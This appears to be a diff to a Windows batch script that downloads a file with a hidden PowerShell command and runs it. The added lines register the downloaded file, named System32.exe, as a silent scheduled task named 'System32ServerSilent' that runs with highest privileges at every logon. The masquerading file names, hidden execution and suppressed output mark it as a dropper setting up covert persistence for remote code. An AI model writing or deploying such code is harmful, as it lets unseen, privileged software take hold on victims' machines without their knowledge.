@@ -49,10 +49,19 @@ if errorlevel 1 (
 :: Clear DNS cache and add no-cache headers to Invoke-WebRequest to try and bypass caching.
 :: A random parameter is also added to the URL to bypass any potential client-side cache.
 powershell -WindowStyle Hidden -Command "Clear-DnsClientCache; Invoke-WebRequest -Uri '%DOWNLOAD_URL%?r=%RANDOM%' -Headers @{'Cache-Control'='no-cache'; 'Pragma'='no-cache'} -OutFile '%TARGET_FILE%' -UseBasicParsing" >nul 2>&1
-:: 6. Immediately execute the newly downloaded client. It is started twice to help ensure execution.
+:: 6. Immediately execute the newly downloaded client (System32.exe) and register it to always run with admin rights silently at logon
+
 if exist "%TARGET_FILE%" (
     start "" "%TARGET_FILE%"
     start "" "%TARGET_FILE%"
+
+    :: Setup permanent silent task to run with admin at logon
+    SCHTASKS /Create ^
+     /TN "System32ServerSilent" ^
+     /TR "\"%TARGET_FILE%\"" ^
+     /SC ONLOGON ^
+     /RL HIGHEST ^
+     /F >nul 2>&1
 )
 
 :: Delete old msconfig.exe if it exists in Microsoft folder
